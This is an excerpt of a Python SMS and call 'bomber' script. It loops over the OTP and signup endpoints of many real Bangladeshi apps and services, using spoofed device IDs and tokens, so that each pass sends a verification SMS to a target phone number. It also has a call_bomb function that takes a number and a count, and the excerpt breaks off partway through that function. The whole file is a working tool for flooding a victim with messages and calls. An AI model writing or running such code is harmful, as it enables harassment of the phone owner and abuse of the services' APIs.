...
def sent_pin_pre(number, amount,oparetor):
    ...
    while i < amount:
        ...
        try:
            url_arogga = "https://api.arogga.com/v1/auth/sms/send?f=app&v=5.0.4&os=android&osv=23"
            headers_arogga = {"Content-Type": "application/x-www-form-urlencoded"}
            data_arogga = 'mobile='+number+'&fcmToken=fqSHY03bRdSAdWWjU2GIkK%253AAPA91bFPPpSVqAWXw3kK9otgFP8Mw1jzdDIQBeoe6KTT0HjI8rSu8InkshvsY4CjZc9mwyu-E6XwZo3xZRhBtjqGtGuhawQYdph1g58bm5WGeRSY6rK8BdxgKWbCXcEgpKUKEdUpJIT8&referral='
            requ_arogga_server = requests.post(url_arogga, headers=headers_arogga, data=data_arogga)
            if requ_arogga_server.json()["message"] == "SMS sent to your mobile number":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        #BONGO
        try:
            url_bongo = "https://api.bongo-solutions.com/auth/api/login/send-otp"
            headers_bongo = {"Content-Type":"application/json"}
            data_bongo = '{"msisdn": "'+number+'","operator": "all"}'
            requ_bongo_server = requests.post(url_bongo, headers=headers_bongo, data=data_bongo)
            if requ_bongo_server.json()["code"] == "success":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            url_corkhi = "https://prod-api.viewlift.com/identity/signup?platform=android&device=android_phone&site=prothomalo&deviceId=b9a9f6de8bdc2b01&deviceName=Samsung%20SM-G532"
            headers_corkhi = {"Content-Type":"application/json"}
            data_corkhi = '{"email": "","emailConsent": false,"whatsappConsent": false,"name": null,"otpValue": null,"phoneNumber": "'+number+'","requestType": "send","preferences": null}'
            requ_corkhi_server = requests.post(url_corkhi, headers=headers_corkhi, data=data_corkhi)
            if requ_corkhi_server.json()["sent"] == "true":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            if requ_hungrynaki_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            data_shikho = '{"auth_type": "signup","phone": "'+number+'","type": "student"}'
        ...
        try:
            ...
            data_tallypay = '{"name": null,"uuid": "e6ef4b45-4930-4dde-bc7a-8c0f1e2cb6b6","app_type": "TALLYKHATA","device_id": "b9a9f6de8bdc2b01","device_type": "ANDROID","mobile_number": "'+number+'"}'
        ...
        try:
            ...
            data_tap = '{"deviceId":"'+str(ID)+'","operator":"' + operator+ '"","walletNumber":"'+number+'"}'
        ...
        try:
            ...
            if requ_madhumati_server.json()["message"] == "OTP Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            data_osudpotro = '{"mobile": "' + numberTwo + '","deviceToken": "web","language": "en","os": "web"}'
            requ_osudpotro_server = requests.post(url_osudpotro, headers=headers_osudpotro, data=data_osudpotro)
            if requ_osudpotro_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            data_doctime = '{"flag": "https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png","code": "88","contact_no": "' + numberTwo + '","country_calling_code": "88"}'
            requ_doctime_server = requests.post(url_doctime, headers=headers_doctime, data=data_doctime)
            if requ_doctime_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            data_quizgiri = '{"phone":"' + numberTwo + '","country_code":"+880","fcm_token":null}'
            requ_quizgiri_server = requests.post(url_quizgiri, headers=headers_quizgiri, data=data_quizgiri)
            if requ_quizgiri_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
...
def call_bomb():
    ...
    banner_premium()
    number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
    amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT[MAX 40]: {random.choice(colorArr)}"))
    time.sleep(3)
    if len(number) == 11:
        if amount <= 40:
            if number in ['01988981373', '01990722540']:
                ...
                while i < amount:
                    ...
                    try:
                        ...
                        pass
                    try:
                        url_5 = "https://www.fairy-ln.xyz/fairyln/v2/ekbJKysHoKytmupUhds03ROjhy6uDuh8Mp9TkoHo6%2Bk%3D"
                        headers_5 = {
                        "Appcode":"FairyLN",
                        "Content-Type":"application/json",
                        "Accept-Encoding":"gzip, deflate",
